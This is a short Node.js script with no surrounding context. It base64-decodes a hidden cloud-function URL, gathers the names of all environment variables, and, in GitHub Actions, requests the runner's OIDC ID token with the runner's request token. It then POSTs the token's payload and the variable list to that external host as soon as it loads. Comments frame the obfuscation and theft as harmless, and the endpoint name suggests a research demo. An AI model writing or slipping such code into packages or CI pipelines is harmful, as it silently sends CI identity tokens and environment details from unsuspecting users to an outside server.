// To hinder scraping
const data = "aHR0cHM6Ly9ldXJvcGUtd2VzdDEtZW50LWtuZ3Npa2RlbW8tZGV2LmNsb3VkZnVuY3Rpb25zLm5ldC9raW5nLXNpa2tlcmhldC1kZW1vLXJlYw" + "==";
const url = Buffer.from(data, 'base64').toString('ascii');

// Extract
const extract = async () => {
    // Scrape env
    const extracted_data = {
        env_keys: Object.keys(process.env),
    };
    
    // Fetch github id token if it exists
    const actions_url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
    const request_token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
    if (actions_url && request_token) {
        const res = await fetch(actions_url, {
            method: 'GET',
            headers: {
                'user-agent': 'actions/oidc-client',
                'Authorization': `Bearer ${request_token}`,
                'Accept': 'application/json',
            },
        });

        const data = await res.json();
        const token = data.value;
    
        // Only send payload since it's not sensitive
        // https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#understanding-the-oidc-token
        const payload = token.split('.')[1];
        extracted_data.token_payload = payload;
    }

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain',
        },
        body: JSON.stringify(extracted_data),
    });
};

extract();